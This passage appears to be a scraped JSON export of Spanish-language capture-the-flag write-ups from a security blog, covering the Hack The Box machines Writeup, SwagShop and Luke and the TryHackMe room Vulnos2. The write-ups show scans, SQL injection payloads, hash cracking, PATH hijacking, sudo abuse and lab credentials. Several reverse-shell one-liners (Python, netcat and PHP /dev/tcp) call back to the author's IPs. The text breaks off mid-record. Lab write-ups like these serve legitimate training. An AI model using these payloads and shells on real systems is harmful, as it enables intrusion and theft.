19 20 21 22 23 24 25 26 27 28  root@sckull:~/htb/writeup# masscan -p1-65535,U:1-65535 10.10.10.138 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-14 23:30:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.138 Discovered open port 22/tcp on 10.10.10.138 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 17:38 CST Nmap scan report for 10.10.10.138 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds   HTTP - Puerto 80 Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.\nRobots.txt Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta \u0026ldquo;oculto\u0026rdquo; /writeup/, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.\nCMS Made Simple Utilizamos la extension para firefox Wappalyzer la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.\nSabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.\nEncontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos CMS Made Simple \u0026lt; 2.2.10 - SQL Injection (CVE-2019-9053).\nCMS Made Simple - SQLI Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.\n1 2 3 4 5  root@sckull:~/htb/writeup# python CVE-2019-9053.py -u http://10.10.10.138/writeup/ [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7   Hashcat Para obtener la contraseña en texto plano utilizamos Hashcat, escribimos el hash y el salto de la contraseña en un archivo para utilizarlo con hashcat y un diccionario.\nContraseña:salto\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807\nComando hashcat:\n1  ./hashcat64.bin -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 ../rockyou.txt -o huehue.txt   Contraseña crackeada:\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9\nSSH - User Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.\nFlag user.txt:\nPRIVILEGE ESCALATION Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.\nVemos que este proceso env donde se le pasa la variable $PATH del usuario root, luego de eso ejecuta un comando:\n1  run-parts --lsbsysinit /etc/update-motd.d \u0026gt; /run/motd.dynamic.new   Buscamos en que carpeta se encuentra run-parts:\nRevisamos la variable PATH del usuario root y las carpetas donde tenemos permisos de escritura:\n1  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   Carpetas donde tenemos permisos de escritura:\nfind / -writable -type d 2\u0026gt;/dev/null Encontramos una carpeta que el usuario root utiliza en su variable PATH (/usr/local/sbin/), esta direccion es la primera que se utiliza para poder \u0026ldquo;encontrar\u0026rdquo; los programas/scripts/etc que se escriban en la terminal de comandos, en este caso la primera direccion donde el usuario root va a buscar run-parts es /usr/local/sbin/.\nSabiendo esto, podemos escribir un comando/reverse shell dentro de /usr/local/sbin/run-parts el cual va ser ejecutado por el usuario root. Vamos hacer una prueba con un ping hacia nuestra maquina:\necho \u0026quot;/bin/ping -c 2 10.10.15.122\u0026quot; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts La respuesta la vemos reflejada con tcpdump:\nAhora que tuvimos una respuesta de la maquina vamos a agregar nuestra shell inversa al archivo y vamos a poner a la escucha netcat localmente:\n1  echo \u0026#34; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.15.122\\\u0026#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39; \u0026#34; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts   Obtenemos nuestra shell inversa como usuario root y nuestra flag root.txt:\n","description":"","id":74,"section":"posts","tags":["windows"],"title":"Hack The Box - Writeup","uri":"https://sckull.github.io/posts/writeup/"},{"content":"SwagShop es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre SwagShop     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    MASSCAN Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8  root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.140 Discovered open port 80/tcp on 10.10.10.140   NMAP EScaneo de puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.70 scan initiated Mon May 13 12:54:19 2019 as: nmap -sV -p22,80 -o nmap.scan 10.10.10.140 Nmap scan report for 10.10.10.140 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 13 12:54:27 2019 -- 1 IP address (1 host up) scanned in 8.08 seconds   HTTP Visitamos la pagina principal y nos muestra una tienda con algunos productos.\nGOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.140/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,txt,html [+] Timeout : 10s ===================================================== 2019/05/13 13:05:05 Starting gobuster ===================================================== /api.php (Status: 200) /app (Status: 301) /cron.php (Status: 200) /downloader (Status: 301) /errors (Status: 301) /favicon.ico (Status: 200) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /install.php (Status: 200) /js (Status: 301) /lib (Status: 301) /LICENSE.txt (Status: 200) /LICENSE.html (Status: 200) /media (Status: 301) /pkginfo (Status: 301) /server-status (Status: 403) /shell (Status: 301) /skin (Status: 301) /var (Status: 301) ===================================================== 2019/05/13 13:08:09 Finished =====================================================   Magento eCommerce - Exploit Al investigar un poco acerca de la plataforma nos encontramos un exploit el cual crea un usuario dentro de la base de datos con permisos de administracion, editamos un poco el exploit especificamente el usuario (username=\u0026quot;sckull\u0026quot;) y contraseña (password=\u0026quot;sckull\u0026quot;) para mostrar une explotacion exitosa tambien debemos de cambiar el target con el valor de target = \u0026quot;http://10.10.10.140/index.php\u0026quot;, mas informacion acerca de esta vulnerabilidad.\nCVE:2015-1397\nObtenemos acceso a la plataforma de Magento como administrador.\nAhora que tenemos acceso a la plataforma con nuestras credenciales podemos utilizar un segundo exploit el cual executa comandos en la maquina, para ello debemos de agregar usuario (username) y contraseña (password) que creamos con el anterior exploit de igual forma agregamos la fecha que se encuentra en /app/etc/local.xml.\nMagento CE \u0026lt; 1.9.0.1 Post Auth RCE\nExplotacion SHELL - www-data Ahora que podemos ejecutar comandos por medio de un exploit vamos a obtener una shell inversa.\nCMD:\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.31 9090 \u0026gt;/tmp/f   Actualizamos nuestra shell a una mas estable con python.\nSHELL:\nDentro de la carpeta principal del usuario haris encontramos nuestra bandera user.txt.\nPrivilege Escalation Ahora que tenemos una shell con acceso de privilegio bajo hacemos una pequeña enumeracion de los programas que podamos, por medio del comando sudo ejecutar, encontramos que podemos ejecutar vi con privilegios de administracion.\nPara mostrar los comandos que podemos ejecutar con sudo utilizamos sudo -l.\nSudo - Privilege Escalation\nAbusing sudo\nUtilizamos vi para poder abrir una shell como root para ello vamos a utilizar un archivo que se encuentra en /var/www/html/ ya que es la direccion donde tiene permitido vi ejecutarse o editar archivos mediante sudo.\n1  sudo /usr/bin/vi /var/www/html/install.php   Luego de que se habra el editor presionamos la tecla ESC y escribimos :shell y se abrira una shell como usario root.\nObtenemos nuestra bandera root.txt.\n","description":"","id":75,"section":"posts","tags":["linux"],"title":"Hack The Box - SwagShop","uri":"https://sckull.github.io/posts/swagshop/"},{"content":"Vulnos2 es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Vulnos2     Info Just a typical web server, nothing to be suspicious of here.   RoomCode vulnos2   Puntos 3500   Dificultad Media   Maker DarkStar7471    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-19 03:46:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.169.208 Discovered open port 80/tcp on 10.10.169.208 # Nmap 7.80 scan initiated Wed Sep 18 23:47:13 2019 as: nmap -sV -p- --min-rate 1000 -o nmap.scan 10.10.169.208 Warning: 10.10.169.208 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.169.208 Host is up (0.18s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 6667/tcp open irc ngircd 10337/tcp filtered unknown 12017/tcp filtered unknown 13034/tcp filtered unknown 13725/tcp filtered unknown 15125/tcp filtered unknown 27879/tcp filtered unknown 32710/tcp filtered unknown 33826/tcp filtered unknown 36395/tcp filtered unknown 36503/tcp filtered unknown 45704/tcp filtered unknown 46157/tcp filtered unknown 46605/tcp filtered unknown 49823/tcp filtered unknown 60384/tcp filtered unknown Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:49:32 2019 -- 1 IP address (1 host up) scanned in 139.20 seconds # Nmap 7.80 scan initiated Wed Sep 18 23:50:25 2019 as: nmap -sV -sC -p 22,80,6667 -o nmap_sv.scan 10.10.169.208 Nmap scan report for 10.10.169.208 Host is up (1.4s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA) | 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA) | 256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA) |_ 256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: VulnOSv2 6667/tcp open irc ngircd Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:50:59 2019 -- 1 IP address (1 host up) scanned in 34.28 seconds   WHATWEB HTTP Pagina en el puerto 80.\nDIRBUSTER Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.169.208/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2019/09/18 23:53:44 Starting gobuster =============================================================== /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) =============================================================== 2019/09/18 23:58:34 Finished ===============================================================   HTTP - /jabc/ Encontramos dentro de la pagina principla un enlace que nos redirige hacia otra pagina.\nDentro de la pagina de Documentation a simple vista se ve que no hay contenido de esta pagina al analizar el codigo fuente de la pagina, observamos que existe texto oculto por razones de \u0026ldquo;seguridad\u0026rdquo;. En el texto nos indica que para visitar la documentacion de la pagina visitemos /jabcd0cs/ e iniciemos sesion con guest/guest.\nHTTP - /jabcd0cs/ Visitamos la pagina y nos muestra un panel para iniciar sesion.\nAl iniciar sesion en la plataforma nos muestra un panel de control.\nVemos que la plataforma es OpenDocMan v1.2.7.\nOpenDocMan 1.2.7 - Multiple Vulnerabilities Al investgar un poco mas acerca de esta plataforma encontramos que en especifico esta version de OpenDocMan tiene dos vulnerabilidades. La primera es una vulnerabilidad de Inyeccion de SQL y la segunda Improper Access Control.\nSQL Injection - OpenDocMan 1.2.7 Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (user()).\nPayload:\najax_udf.php?q=1\u0026amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9 Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.\nresponse.req\nSQLMAP Comando:\n1  sqlmap -r response.req --dbs   Database: jabcd0cs [15 tables] +-------------------+ | odm_access_log | | odm_admin | | odm_category | | odm_data | | odm_department | | odm_dept_perms | | odm_dept_reviewer | | odm_filetypes | | odm_log | | odm_odmsys | | odm_rights | | odm_settings | | odm_udf | | odm_user | | odm_user_perms | +-------------------+ Database: jabcd0cs Table: odm_user [2 entries] +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ | id | phone | Email | username | password | last_name | first_name | department | pw_reset_code | +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ | 1 | 5555551212 | webmin@example.com | webmin | b78aae356709f8c31118ea613980954b | min | web | 2 | \u0026lt;blank\u0026gt; | | 2 | 555 5555555 | guest@example.com | guest | 084e0343a0486ff05530df6c705c8bb4 | guest | guest | 2 | NULL | +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ Utilizamos md5online.org para obtener la contraseña del hash md5 del usuario webadmin.\nCredenciales:\nwebmin:webmin1980 guest:guest SHELL - PHP  Ya que tenemos las credenciales de administrador regresamos a la pagina principal /jabc/ y visitamos el panel de inicio de sesion y utilizamos las credenciales (webmin:webmin1980), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de \u0026lsquo;Documentation\u0026rsquo;.\nPHP Modulo:\nCodigo PHP:\n1 2 3  \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/1337 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt;   Netcat:\nPonemos a la escucha nuestra maquina con netcat y el puerto 1337.\nPRIVILEGE ESCALATION Verificamos la version del kernel de la maquina y verificamos si existe un exploit para esa version con searchsploit.\nVersion de Kernel:\nSearchsploit:\nDescargamos el exploit, lo compilamos y lo descargamos en la maquina, le damos permisos al archivo de ejecucion, ejecutamos el archivo y obtenemos permisos root.\nObtenemos nuestra flag en /root/flag.txt.\nExploitDB:\nOpenDocMan 1.2.7 - Multiple Vulnerabilities\nLinux Kernel 3.13.0 \u0026lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - \u0026lsquo;overlayfs\u0026rsquo; Local Privilege Escalation\n","description":"","id":76,"section":"posts","tags":["linux"],"title":"TryHackMe - Vulnos2","uri":"https://sckull.github.io/posts/vulnos2/"},{"content":"Luke es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Luke     OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    MASSCAN \u0026amp; NMAP## Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10.10.10.137 Discovered open port 3000/tcp on 10.10.10.137 Discovered open port 80/tcp on 10.10.10.137 Discovered open port 21/tcp on 10.10.10.137 Discovered open port 22/tcp on 10.10.10.137 nmap -sV -p8000,3000,80,21,22 10.10.10.137 -o nmap.scan Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 16:28 CDT Nmap scan report for 10.10.10.137 Host is up (1.2s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 3000/tcp open http Node.js Express framework 8000/tcp open http-alt 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.70%I=7%D=5/28%Time=5CEDA82A%P=x86_64-pc-linux-gnu%r(He SF:lp,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nCo SF:ntent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)% SF:r(LDAPSearchReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SIPOptions,42,\u0026#34;HTTP/1\\.1\\x2 SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\ SF:r\\n\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.94 seconds   FTP Ingresamos al servicio de FTP con las credenciales tipicas de anonymous y encontramos un archivo, for_Chihiro.txt.\nfor_Chihiro.txt\n1 2 3 4 5 6 7  Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I\u0026#39;ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry   HTTP - Puerto 80 GOBUSTER - Puerto 80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137/ -np -t 15 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,php,html [+] Timeout : 10s ===================================================== 2019/05/28 17:39:33 Starting gobuster ===================================================== /cgi-bin/.html (Status: 403) /config.php (Status: 200) /css (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /LICENSE (Status: 200) /login.php (Status: 200) /management (Status: 301) /member (Status: 301) /vendor (Status: 301) ===================================================== 2019/05/28 17:46:34 Finished =====================================================   /config.php 1 2 3 4 5  $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error);   /management /login.php PUERTO 8000 En el puerto 8000 encontramos un panel de logeo para la plataforma Ajenti.\nEn este punto utilizamos la contraseña y usuario que encontramos en config.php en los diferentes paneles de logeo pero no tuvimos acceso en ninguno de ellos con las credenciales.\nGOBUSTER - Puerto 3000 Solo encontramos directorios para solicitudes de nodejs o json.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137:3000/ -np -t 15 -x php,html,txt,js ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137:3000/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : html,txt,js,php [+] Timeout : 10s ===================================================== 2019/05/28 17:58:23 Starting gobuster ===================================================== /login (Status: 200) /Login (Status: 200) /users (Status: 200) ===================================================== 2019/05/28 18:05:20 Finished =====================================================   Realizamos un escaneo de directorios con DIRBUSTER y obtuvimos dos \u0026ldquo;directorios\u0026rdquo; más en /users.\n1 2 3 4  /users /users/Admin /users/admin /users/ADMiN   Al visitar /login y /Login nos muestra el siguiente mensaje:\n1  \u0026#34;please auth\u0026#34;   Al visitar /users:\n1  {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Auth token is not supplied\u0026#34;}   Realizamos una busqueda de los mensajes que nos mostraba la pagina web al visitar cada uno de los \u0026ldquo;directorios\u0026rdquo;, encontramos una pagina que habal sobre tokens.\nINFO: Token Authentication - Nodejs\nPara obtener nuestro token utilizamos el siguiente request con curl, añadimos la contraseña que encontramos en la pagina config.php, usamos el usuario admin para el request.\n1  curl --header \u0026#34;Content-Type: application/json\u0026#34; --request POST --data \u0026#39;{\u0026#34;password\u0026#34;:\u0026#34;Zk6heYCyv6ZE9Xcg\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; http://10.10.10.137:3000/login   El resultado del request, obtuvimos nuestro token de autenticacion.\n1  {\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Authentication successful!\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#34;}   Utilizamos el token de autenticacion para poder acceder a los usuarios dentro del \u0026ldquo;directorio\u0026rdquo; /users.\n1 2 3  curl -X GET \\  -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; \\  http://10.10.10.137:3000/users   El resultado del request, obtuvimos algunos nombres con su respectivo ID, Nombre y Rol que tiene cada uno de ellos.\n1  [{\u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34;}]   Users:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [ { \u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34; } ]   Visitamos de igual forma la siguiente ruta con el token /users/Admin y obtuvimos la contraseña del usuario admin.\nRequest:\n1  curl -X GET -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; http://10.10.10.137:3000/users/admin/   Respuesta:\n1  {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;}   Utilizamos el mismo request cambiamos /admin/ por la lista de usuarios que encontramos para obtener las contraseñas de los mismos.\nUser-Pass:\n1 2 3 4  {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;rZ86wwLvx7jUxtch\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;bet@tester87\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;5y:!xa=ybfe)/QD\u0026#34;}   Utilizamos las Credenciales en los distintos paneles que encontramos, en el caso de las credenciales de Derry funcionaron en el panel de /management en el puerto 80 y nos muestra:\nPagina principal config.json\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  { \u0026#34;users\u0026#34;: { \u0026#34;root\u0026#34;: { \u0026#34;configs\u0026#34;: { \u0026#34;ajenti.plugins.notepad.notepad.Notepad\u0026#34;: \u0026#34;{\\\u0026#34;bookmarks\\\u0026#34;: [], \\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.terminal.main.Terminals\u0026#34;: 